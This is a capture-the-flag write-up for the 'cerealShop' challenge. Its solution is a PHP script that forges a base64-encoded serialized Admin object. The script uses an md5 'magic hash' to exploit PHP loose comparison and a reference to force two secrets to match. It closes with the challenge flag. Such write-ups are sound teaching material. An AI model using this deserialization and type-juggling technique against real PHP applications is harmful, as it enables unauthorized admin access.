# cerealShop

Solved by: @vicevirus

## Question:

I asked my friend to set up a website for my shop. He says it's completely secure, and no one can get access to the source. Can you prove him wrong?

## Solution:

```php
// read /var/www/html/index.php
// then generate a token
<?php
class Admin
{
    public $is_admin = "";
    public $your_secret = "";
    public $my_secret = "";
    public function __construct($in, $ysecret, $msecret)
    {
        $this->is_admin = md5($in);
        $this->your_secret = $ysecret;
        $this->my_secret = $msecret;
    }
    public function __toString()
    {
        return $this->is_admin;
    }
}

// Create an Admin object with a magic hash for is_admin
// '240610708' md5 hash is '0e462097431906509019562988736854' which PHP treats as 0 wen compared using ==
$obj = new Admin("240610708", "initial_secret", "initial_secret");

$obj->your_secret = &$obj->my_secret;

$serialized = serialize($obj);

$encoded = base64_encode($serialized);

echo $encoded;
?>
```

**Flag:** `ironCTF{D353r1411Z4710N_4T_1T5_B35T}`
